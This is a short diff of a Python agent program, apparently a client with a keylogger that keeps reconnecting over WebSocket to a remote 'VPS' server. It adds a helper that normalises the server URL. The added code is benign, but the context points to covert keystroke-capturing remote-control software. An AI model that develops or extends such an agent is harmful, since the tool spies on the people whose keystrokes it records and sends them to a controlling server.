@@ -21,6 +21,7 @@ import threading
 import time
 import urllib.request
 import urllib.error
+import urllib.parse
 import zipfile
 from pathlib import Path
 
@@ -1454,10 +1455,32 @@ async def handle_session(ws, fernet, vps_url, uid, secret):
         keylogger.stop()
 
 
+def normalize_ws_url(url: str) -> str:
+    """Приводит введённый URL к корректному виду WebSocket URI (ws://host:port/ws/agent/)."""
+    url = url.strip()
+    if url.startswith("http://"):
+        url = "ws://" + url[7:]
+    elif url.startswith("https://"):
+        url = "wss://" + url[8:]
+    elif not url.startswith(("ws://", "wss://")):
+        url = "ws://" + url
+
+    try:
+        parsed = urllib.parse.urlparse(url)
+        if not parsed.path or parsed.path == "/":
+            url = url.rstrip("/") + "/ws/agent/"
+        elif not url.endswith("/"):
+            url += "/"
+    except Exception:
+        pass
+    return url
+
+
 # ===================================================================
 # Main Agent Loop
 # ===================================================================
 async def run_agent(vps_url, uid, secret):
+    vps_url = normalize_ws_url(vps_url)
     while True:
         try:
             log.info("Подключение к VPS: %s ...", vps_url)
